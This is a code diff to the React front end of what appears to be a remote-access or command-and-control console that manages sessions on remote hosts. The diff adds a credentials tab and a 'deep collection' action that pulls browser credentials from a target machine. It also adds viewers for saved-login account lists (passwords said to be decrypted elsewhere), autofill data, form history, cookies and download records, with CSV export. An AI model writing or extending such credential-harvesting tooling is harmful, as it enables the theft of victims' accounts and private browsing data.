@@ -14,6 +14,7 @@ import {
   FolderOutlined,
   HddOutlined,
   InboxOutlined,
+  KeyOutlined,
   PauseOutlined,
   ReloadOutlined,
   UploadOutlined,
@@ -24,13 +25,16 @@ import { api, downloadGet, getToken } from '../api'
 import { useWs } from '../hooks/useWs'
 import { statusLabel, statusTone } from '../status'
 import type { SessionRow } from './Sessions'
+import CredsPanel from './CredsPanel'
 import TerminalPanel from './TerminalPanel'
 import styles from './console.module.css'
 
-type Mod = 'cmd' | 'files' | 'desk' | 'browser'
+type Mod = 'cmd' | 'files' | 'desk' | 'browser' | 'creds'
 type FsItem = { key: string; kind: 'dir' | 'file'; name: string; size: number; mtime?: number }
 type BrowserRow = { key: string; kind: string; browser: string; a: string; b: string; c: string; size: number; path: string }
 type BrowserSnap = { at: number; rows: string[] }
+type StoreKind = 'history' | 'cookies' | 'bookmarks' | 'downloads' | 'autofill' | 'logins' | 'formhistory'
+type DbKind = '' | StoreKind
 type Shot = { id: string; url: string; w: number; h: number; at: number }
 type StashItem = { id: string; name: string; remote: string; size: number; at: number }
 type XferJob = {
@@ -125,7 +129,24 @@ function saveCsv(name: string, cols: string[], rows: string[][]) {
   URL.revokeObjectURL(url)
 }
 
-const BROWSER_KINDS = new Set(['F', 'V', 'B', 'E'])
+const BROWSER_KINDS = new Set(['F', 'V', 'B', 'E', 'P', 'K'])
+
+const DB_LABEL: Record<StoreKind, string> = {
+  history: '浏览历史',
+  cookies: 'Cookie 元数据',
+  bookmarks: '书签',
+  downloads: '下载记录',
+  autofill: '自动填充数据',
+  logins: '账号列表',
+  formhistory: '表单历史',
+}
+
+function dbTitle(kind: DbKind) {
+  if (!kind) return ''
+  if (kind === 'cookies') return 'Cookie 元数据（主机 / 名称 / 过期时间，不含值）'
+  if (kind === 'logins') return '账号列表（URL / 用户名 / 使用次数，密码在凭据页解密）'
+  return DB_LABEL[kind]
+}
 
 function parseBrowser(output: string): BrowserRow[] {
   return output
@@ -196,6 +217,7 @@ const MODS: { key: Mod; label: string; icon: ReactNode }[] = [
   { key: 'cmd', label: '命令控制', icon: <CodeOutlined /> },
   { key: 'desk', label: '远程桌面', icon: <DesktopOutlined /> },
   { key: 'browser', label: '浏览器信息', icon: <CompassOutlined /> },
+  { key: 'creds', label: '凭据', icon: <KeyOutlined /> },
 ]
 
 export default function Host() {
@@ -206,7 +228,7 @@ export default function Host() {
   const [sp, setSp] = useSearchParams()
   const [info, setInfo] = useState<SessionRow | null>(null)
   const rawMod = sp.get('mod')
-  const mod: Mod = rawMod === 'screen' ? 'desk' : (['cmd', 'files', 'desk', 'browser'] as Mod[]).includes(rawMod as Mod) ? (rawMod as Mod) : 'files'
+  const mod: Mod = rawMod === 'screen' ? 'desk' : (['cmd', 'files', 'desk', 'browser', 'creds'] as Mod[]).includes(rawMod as Mod) ? (rawMod as Mod) : 'files'
   const setMod = (m: Mod) => {
     const next = new URLSearchParams(sp)
     next.set('mod', m)
@@ -347,10 +369,11 @@ export default function Host() {
   const [browserQ, setBrowserQ] = useState('')
   const [browserSnaps, setBrowserSnaps] = useState<BrowserSnap[]>([])
   const [browserSnapAt, setBrowserSnapAt] = useState(0)
-  const [dbKind, setDbKind] = useState<'' | 'history' | 'cookies' | 'bookmarks'>('')
+  const [dbKind, setDbKind] = useState<DbKind>('')
   const [dbCols, setDbCols] = useState<string[]>([])
   const [dbRows, setDbRows] = useState<string[][]>([])
   const [dbBusy, setDbBusy] = useState(false)
+  const [deepBusy, setDeepBusy] = useState(false)
 
   const scanBrowser = useCallback(async () => {
     if (!id) return
@@ -377,7 +400,7 @@ export default function Host() {
   }, [id, info?.hostname, message])
 
   const loadStore = useCallback(
-    async (path: string, kind: 'history' | 'cookies' | 'bookmarks') => {
+    async (path: string, kind: StoreKind) => {
       if (!id || !path) return
       setDbBusy(true)
       try {
@@ -388,7 +411,7 @@ export default function Host() {
         setDbKind(kind)
         setDbCols(r.columns || [])
         setDbRows(r.rows || [])
-        message.success(`${kind === 'history' ? '浏览历史' : 'Cookie 元数据'}：${(r.rows || []).length} 条`)
+        message.success(`${DB_LABEL[kind]}：${(r.rows || []).length} 条`)
       } catch (e) {
         message.error((e as Error).message)
       } finally {
@@ -397,6 +420,22 @@ export default function Host() {
     },
     [id, message],
   )
+
+  const scanDeep = useCallback(async () => {
+    if (!id) return
+    setDeepBusy(true)
+    try {
+      const { task_id } = (await api(`/api/sessions/${id}/browser/deep`, { method: 'POST', body: '{}' })) as {
+        task_id: string
+      }
+      await waitTask(id, task_id)
+      message.success('已采集浏览器凭据，请到「凭据」页查看')
+    } catch (e) {
+      message.error(e instanceof Error ? e.message : '深度收集失败')
+    } finally {
+      setDeepBusy(false)
+    }
+  }, [id, message])
 
   const showSnapshot = useCallback((at: number) => {
     setBrowserSnapAt(at)
@@ -410,6 +449,12 @@ export default function Host() {
   const fileRows = browserRows.filter((r) => (r.kind === 'F' || r.kind === 'V') && browserMatch(r))
   const bmRows = browserRows.filter((r) => r.kind === 'B' && browserMatch(r))
   const extRows = browserRows.filter((r) => r.kind === 'E' && browserMatch(r))
+  const cfgRows = browserRows.filter((r) => (r.kind === 'P' || r.kind === 'K') && browserMatch(r))
+  const storeBtn = (r: BrowserRow, kind: StoreKind, label: string) => (
+    <Button type="link" size="small" disabled={!r.path || dbBusy} onClick={() => void loadStore(r.path, kind)}>
+      {label}
+    </Button>
+  )
 
   const loadShots = useCallback(async () => {
     if (!id) return
@@ -1039,14 +1084,17 @@ export default function Host() {
         <div className={styles.fill} hidden={mod !== 'browser'}>
           <div className={styles.browserPane}>
             <div className={styles.browserHead}>
-              <Button size="small" icon={<ReloadOutlined />} loading={browserBusy} disabled={!online} onClick={() => void scanBrowser()}>
+              <Button size="small" icon={<ReloadOutlined />} loading={browserBusy} disabled={!online || deepBusy} onClick={() => void scanBrowser()}>
                 扫描浏览器
+              </Button>
+              <Button size="small" icon={<KeyOutlined />} loading={deepBusy} disabled={!online || browserBusy} onClick={() => void scanDeep()}>
+                深度收集
               </Button>
               <Input size="small" allowClear placeholder="筛选浏览器 / 配置 / 名称" value={browserQ} onChange={(e) => setBrowserQ(e.target.value)} style={{ maxWidth: 240 }} />
               <span className={styles.mono}>
                 {browserRows.length
-                  ? `${fileRows.length} 文件 · ${bmRows.length} 书签 · ${extRows.length} 扩展`
-                  : '读取浏览器、配置文件与数据文件的元信息，不解析凭据'}
+                  ? `${fileRows.length} 文件 · ${bmRows.length} 书签 · ${extRows.length} 扩展 · ${cfgRows.length} 配置`
+                  : '采集浏览器配置、历史、Cookie 元数据与账号；密钥解密结果见「凭据」页'}
               </span>
               {browserSnaps.length > 0 ? (
                 <Select
@@ -1076,26 +1124,30 @@ export default function Host() {
                 { title: '最后修改', dataIndex: 'c', width: 170, sorter: (x: BrowserRow, y: BrowserRow) => Number(x.c) - Number(y.c), render: (v: string) => fmtTime(Number(v)) },
                 {
                   title: '操作',
-                  width: 130,
-                  render: (_: unknown, r: BrowserRow) =>
-                    r.b === 'History' ? (
-                      <Button type="link" size="small" disabled={!r.path || dbBusy} onClick={() => void loadStore(r.path, 'history')}>
-                        浏览历史
-                      </Button>
-                    ) : r.b === 'Cookies' ? (
-                      <Button type="link" size="small" disabled={!r.path || dbBusy} onClick={() => void loadStore(r.path, 'cookies')}>
-                        Cookie 元数据
-                      </Button>
-                    ) : r.b === 'places.sqlite' ? (
-                      <span>
-                        <Button type="link" size="small" disabled={!r.path || dbBusy} onClick={() => void loadStore(r.path, 'history')}>
-                          历史
-                        </Button>
-                        <Button type="link" size="small" disabled={!r.path || dbBusy} onClick={() => void loadStore(r.path, 'bookmarks')}>
-                          书签
-                        </Button>
-                      </span>
-                    ) : null,
+                  width: 260,
+                  render: (_: unknown, r: BrowserRow) => {
+                    if (r.b === 'History') {
+                      return (
+                        <span>
+                          {storeBtn(r, 'history', '浏览历史')}
+                          {storeBtn(r, 'downloads', '下载记录')}
+                        </span>
+                      )
+                    }
+                    if (r.b === 'Web Data') return storeBtn(r, 'autofill', '自动填充')
+                    if (r.b === 'Login Data') return storeBtn(r, 'logins', '账号列表')
+                    if (r.b === 'Cookies') return storeBtn(r, 'cookies', 'Cookie 元数据')
+                    if (r.b === 'places.sqlite') {
+                      return (
+                        <span>
+                          {storeBtn(r, 'history', '历史')}
+                          {storeBtn(r, 'bookmarks', '书签')}
+                          {storeBtn(r, 'formhistory', '表单历史')}
+                        </span>
+                      )
+                    }
+                    return null
+                  },
                 },
               ]}
             />
@@ -1127,10 +1179,24 @@ export default function Host() {
                 { title: '版本', dataIndex: 'c', width: 120 },
               ]}
             />
+            <div className={styles.browserSection}>配置摘要</div>
+            <Table
+              size="small"
+              rowKey="key"
+              pagination={{ pageSize: 50, size: 'small', hideOnSinglePage: true }}
+              dataSource={cfgRows}
+              locale={{ emptyText: '无' }}
+              columns={[
+                { title: '浏览器', dataIndex: 'browser', width: 110 },
+                { title: '配置文件', dataIndex: 'a', width: 130 },
+                { title: '项目', dataIndex: 'b', width: 280, ellipsis: true },
+                { title: '值', dataIndex: 'c', ellipsis: true, render: (v: string) => v || '—' },
+              ]}
+            />
             {dbKind ? (
               <>
                 <div className={styles.browserSection}>
-                  {dbKind === 'history' ? '浏览历史' : dbKind === 'bookmarks' ? '书签' : 'Cookie 元数据（主机 / 名称 / 过期时间，不含值）'}
+                  {dbTitle(dbKind)}
                   <Button type="link" size="small" onClick={() => saveCsv(`${dbKind}-${info?.hostname || 'host'}.csv`, dbCols, dbRows)}>
                     导出 CSV
                   </Button>
@@ -1157,6 +1223,11 @@ export default function Host() {
               </>
             ) : null}
           </div>
+        </div>
+        <div className={styles.fill} hidden={mod !== 'creds'}>
+          {mod === 'creds' && id ? (
+            <CredsPanel sid={id} host={info?.hostname || ''} online={online} />
+          ) : null}
         </div>
         <div className={styles.fill} hidden={mod !== 'desk'}>
           <div className={styles.fsSplit} style={{ gridTemplateColumns: `${sideW}px 6px minmax(0, 1fr)` }}>
